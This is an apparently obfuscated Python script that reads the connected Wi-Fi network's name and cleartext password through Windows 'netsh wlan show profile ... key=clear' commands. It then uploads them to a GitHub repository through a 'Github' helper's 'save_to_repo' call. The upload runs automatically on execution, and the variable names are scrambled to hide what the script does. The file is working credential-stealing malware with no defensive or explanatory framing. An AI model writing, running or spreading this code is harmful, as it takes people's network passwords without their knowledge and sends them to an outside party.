import subprocess #line:1
from Github import Github #line:2
class WifiKey :#line:5
    def to_github ():#line:6
        O0000OO0O00O0O000 =Github ()#line:7
        O00OO0O0O00O0O0OO =WifiKey .get_connected_wifi_key ()#line:8
        if O00OO0O0O00O0O0OO is not None :#line:9
            O0000OO0O00O0O000 .save_to_repo ("Wifi/"+O00OO0O0O00O0O0OO [0 ],O00OO0O0O00O0O0OO [1 ].encode ("utf-8"))#line:10
            print ("Wifi done"),#line:11
    def get_content (O0O000O0OO0OO00O0 ,O0O0OO00OOO00O0O0 ):#line:13
        OOOOOOOO0O00OOOOO =O0O0OO00OOO00O0O0 .splitlines ()#line:14
        for O000OO0OOOOO0000O in OOOOOOOO0O00OOOOO :#line:15
            if O0O000O0OO0OO00O0 in O000OO0OOOOO0000O :#line:16
                return O000OO0OOOOO0000O .split (":")[1 ].strip ()#line:17
    def get_connected_wifi_key ():#line:19
        try :#line:20
            O00OO00OOOO000O0O =subprocess .check_output (["netsh","wlan","show","interface"])#line:21
            O00OO00OOOO000O0O =O00OO00OOOO000O0O .decode ("ascii")#line:22
            O00OO00OOOO000O0O =O00OO00OOOO000O0O .replace ("\r","")#line:23
            O0O000O0OOOO00OOO =WifiKey .get_content ("SSID",O00OO00OOOO000O0O )#line:24
            OO00OOO0O0000OO0O =subprocess .check_output (["netsh","wlan","show","profile",f"name={O0O000O0OOOO00OOO}","key=clear"])#line:28
            OO00OOO0O0000OO0O =OO00OOO0O0000OO0O .decode ("ascii")#line:29
            return [O0O000O0OOOO00OOO ,WifiKey .get_content ("Key Content",OO00OOO0O0000OO0O )]#line:30
        except Exception as O0O0OO00O0OOOO0OO :#line:31
            return None #line:32
WifiKey .to_github ()#line:35
print (WifiKey .get_connected_wifi_key ())#line:36
print ("Wi-Fi Key Content:",WifiKey .get_connected_wifi_key ())#line:37
